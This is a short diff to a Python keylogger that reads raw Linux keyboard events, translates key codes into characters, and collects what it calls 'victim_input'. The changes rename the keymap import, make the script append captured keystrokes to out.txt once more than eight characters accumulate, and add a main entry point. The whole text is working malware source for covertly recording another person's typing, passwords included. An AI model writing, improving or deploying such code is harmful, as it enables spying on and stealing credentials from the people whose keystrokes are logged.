@@ -3,7 +3,7 @@
 
 import struct
 import find_keyboard
-import qwerty
+import keymap
 
 
 def main():
@@ -12,7 +12,7 @@ def main():
     event_file = open(filepath, "rb")
 
     # import the list of characters that we scan for
-    input_map = qwerty.map
+    input_map = keymap.qwertymap
 
     search_format = 'llHHI'
     event_size = struct.calcsize(search_format)
@@ -28,7 +28,11 @@ def main():
                 victim_input += input_map[code]
 
         event = event_file.read(event_size)
-        if len(victim_input) == 128:
+        if len(victim_input) > 8:
             with open("out.txt", "a") as f:
                 f.write(victim_input)
                 victim_input = ""
+
+
+if __name__ == '__main__':
+    main()
